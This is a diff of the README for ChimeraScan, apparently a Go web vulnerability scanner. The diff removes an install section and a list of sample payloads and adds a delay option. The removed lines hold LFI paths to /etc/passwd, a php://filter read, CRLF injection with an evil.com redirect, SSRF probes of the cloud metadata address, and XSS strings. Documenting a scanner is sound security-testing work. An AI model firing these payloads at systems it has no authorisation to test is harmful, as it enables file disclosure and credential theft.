@@ -181,13 +181,6 @@ go build -o chimerascan .
 # Run
 ./chimerascan -h
 ```
-
-### ⚡ One-liner Install
-
-```bash
-go install github.com/KimHyunRuiixyn/ChimeraScan@latest
-```
-
 ---
 
 <!-- ═══════════════════════════════════════════════════════════════ -->
@@ -298,6 +291,7 @@ Fitur penting untuk efisiensi scanning — **kapan harus berhenti?**
     -fuzz \
     -T 30 \
     -hit 5 \
+    --delay=0.5
     -poc \
     -o findings.json
 ```
@@ -363,86 +357,6 @@ ChimeraScan/
 └── xss/
     └── fuzzing/payload.txt        ⚡ Payload only (XSS = fuzz only)
 ```
-
----
-
-<!-- ═══════════════════════════════════════════════════════════════ -->
-<!-- ░░░░░░░░░░░░░░░░░░░░░░ PAYLOAD FILES ░░░░░░░░░░░░░░░░░░░░░░░░ -->
-<!-- ═══════════════════════════════════════════════════════════════ -->
-
-<h2 align="center">📂 Payload Files</h2>
-
-Payloads are plain text — one entry per line. Lines starting with `#` are comments.
-
-### `lfi/fuzzing/payload.txt` — Payload only
-
-```
-../../../../etc/passwd
-..%2f..%2f..%2f..%2fetc%2fpasswd
-php://filter/convert.base64-encode/resource=index.php
-```
-
-### `lfi/nofuzz/payload.txt` — Full path/query
-
-```
-/?file=../../../../etc/passwd
-/?file=php://filter/convert.base64-encode/resource=index.php
-```
-
-### `crlf/payload.txt`
-
-```
-/%0d%0aSet-Cookie:coffin=hi
-/%0aSet-Cookie:coffin=hi
-/%0d%0aLocation: www.evil.com
-```
-
-### `ssrf/fuzzing/payload.txt` — URL only
-
-```
-http://127.0.0.1/
-http://169.254.169.254/latest/meta-data/
-```
-
-### `ssrf/nofuzz/payload.txt`
-
-```
-/?url=http://127.0.0.1/
-/?url=http://169.254.169.254/latest/meta-data/
-```
-
-### `openredirect/fuzzing/payload.txt` — URL only
-
-```
-https://bing.com
-//bing.com
-%2F%2Fbing.com
-```
-
-### `openredirect/nofuzz/payload.txt`
-
-```
-/?next=https://bing.com
-/?url=https://bing.com
-/?redirect=https://bing.com
-```
-
-### `xss/fuzzing/payload.txt` — Payload only
-
-```
-<script>alert(1)</script>
-"><script>alert(document.domain)</script>
-<img src=x onerror=alert(1)>
-```
-
-### `Ua.txt` — User-Agent list
-
-```
-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ... Chrome/120.0.0.0 Safari/537.36
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) ... Safari/605.1.15
-Mozilla/5.0 (X11; Linux x86_64) ... Firefox/121.0
-```
-
 ---
 
 <!-- ═══════════════════════════════════════════════════════════════ -->
@@ -748,6 +662,7 @@ go build -o chimerascan .
 | ✅ | User-Agent rotation |
 | ✅ | Hit limit (`-hit=N`) |
 | ✅ | PoC auto-save + JSON export |
+| ✅ | Safey delay (`--delay=1`)
 | ✅ | Graceful Ctrl+C |
 | 🚧 | OAST/Interactsh for blind SSRF / blind XSS |
 | 🚧 | WAF detection & auto-backoff |
